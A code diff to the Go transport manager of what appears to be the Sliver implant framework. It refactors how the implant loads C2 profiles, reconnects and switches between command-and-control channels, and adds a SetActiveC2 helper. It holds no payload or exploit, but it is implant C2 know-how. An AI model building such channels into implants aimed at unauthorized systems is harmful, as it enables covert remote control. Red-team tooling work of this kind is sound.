@@ -84,7 +84,7 @@ func (t *c2s) Init() (err error) {
 
 	// Load all available C2 transports
 	for order, profile := range profiles {
-		c2, err := NewC2FromBytes(profile)
+		c2, err := NewMalleableFromBytes(profile)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("Error parsing C2 profiles: %s", err)
@@ -140,12 +140,12 @@ func (t *c2s) startTransports() (err error) {
 			t.Active = t.selectNextTransport()
 
 			// Wait for the specified interval before looping and starting it.
-			time.Sleep(time.Duration(t.Active.Profile.Interval))
+			time.Sleep(time.Duration(t.Active.Profile.ReconnectInterval))
 			continue
 		}
 
 		// {{if .Config.Debug}}
-		log.Printf("Transport started ()", t.Active.uri.String())
+		log.Printf("Transport started (%s)", t.Active.uri.String())
 		// {{end}}
 		return
 	}
@@ -194,7 +194,7 @@ func (t *c2s) handleTransportErrors() {
 		t.selectNextTransport()
 
 		// Wait for the specified interval before starting it
-		time.Sleep(time.Duration(t.Active.Profile.Interval))
+		time.Sleep(time.Duration(t.Active.Profile.ReconnectInterval))
 
 		// And start it, sending any error back to this routine for cleanup
 		err = t.Active.Start(false, "")
@@ -265,7 +265,7 @@ func (t *c2s) randomCCDomain(uri *url.URL) *C2 {
 // Directly add a C2 to the list of available transports
 func (t *c2s) AddFromProfile(profile string) (err error) {
 	t.mutex.RLock()
-	c2, err := NewC2FromBytes(profile)
+	c2, err := NewMalleableFromBytes(profile)
 	if err != nil {
 		return err
 	}
@@ -321,25 +321,25 @@ func (t *c2s) Get(ID string) (c2 *C2) {
 }
 
 // Switch - Dynamically switch the active transport, if multiple are available.
-func (t *c2s) Switch(ID string) (err error) {
+func (c2 *c2s) Switch(ID string) (err error) {
 
 	var next = Transports.Get(ID)
 	if next == nil {
 		return fmt.Errorf("could not find transport with ID %s", ID)
 	}
-	t.mutex.RLock()
-	t.isSwitching = true
-	t.mutex.RUnlock()
+	c2.mutex.RLock()
+	c2.isSwitching = true
+	c2.mutex.RUnlock()
 
 	// {{if .Config.Debug}}
-	log.Printf("Switching the current transport: %s", t.Active.ID)
+	log.Printf("Switching the current transport: %s", c2.Active.ID)
 	log.Printf("New transport: %s", next.ID)
 	// {{end}}
 
 	// {{if .Config.CommEnabled}}
 
 	// Close the Comm system, and all comm listeners
-	if !t.Active.Profile.CommDisabled && t.Active.Profile.Type != sliverpb.C2Type_Beacon {
+	if !c2.Active.Profile.CommDisabled && c2.Active.Profile.Type != sliverpb.C2Type_Beacon {
 		err = comm.PrepareCommSwitch()
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -351,7 +351,7 @@ func (t *c2s) Switch(ID string) (err error) {
 
 	// Keep the current transport ID, needed when registering
 	// again to the server, for identification purposes.
-	oldTransportID := t.Active.ID
+	oldTransportID := c2.Active.ID
 
 	// Start the transport first.
 	// This automatically sends a transport switch registration message
@@ -360,14 +360,14 @@ func (t *c2s) Switch(ID string) (err error) {
 		// {{if .Config.Debug}}
 		log.Printf(err.Error())
 		// {{end}}
-		t.mutex.RLock()
-		t.isSwitching = false
-		t.mutex.RUnlock()
+		c2.mutex.RLock()
+		c2.isSwitching = false
+		c2.mutex.RUnlock()
 		return err
 	}
 
 	// Cut the old transport
-	err = t.Active.Stop()
+	err = c2.Active.Stop()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf(err.Error())
@@ -375,12 +375,27 @@ func (t *c2s) Switch(ID string) (err error) {
 	}
 
 	// And assign the new one as current
-	t.mutex.RLock()
-	t.Active = next
-	t.isSwitching = false
-	t.mutex.RUnlock()
+	c2.mutex.RLock()
+	c2.Active = next
+	c2.isSwitching = false
+	c2.mutex.RUnlock()
+
+	// {{if .Config.Debug}}
+	log.Printf("Done switching transport: %s", next.ID)
+	// {{end}}
 
 	return nil
+}
+
+// SetActiveC2 - Marks the passed C2 as active
+func (t *c2s) SetActiveC2(transport *C2) {
+	t.mutex.RLock()
+	defer t.mutex.RUnlock()
+	for _, loaded := range t.Available {
+		if loaded.ID == transport.ID {
+			loaded.Profile.Active = true
+		}
+	}
 }
 
 // Shutdown - Close all availables transports. If the exit parameter is true
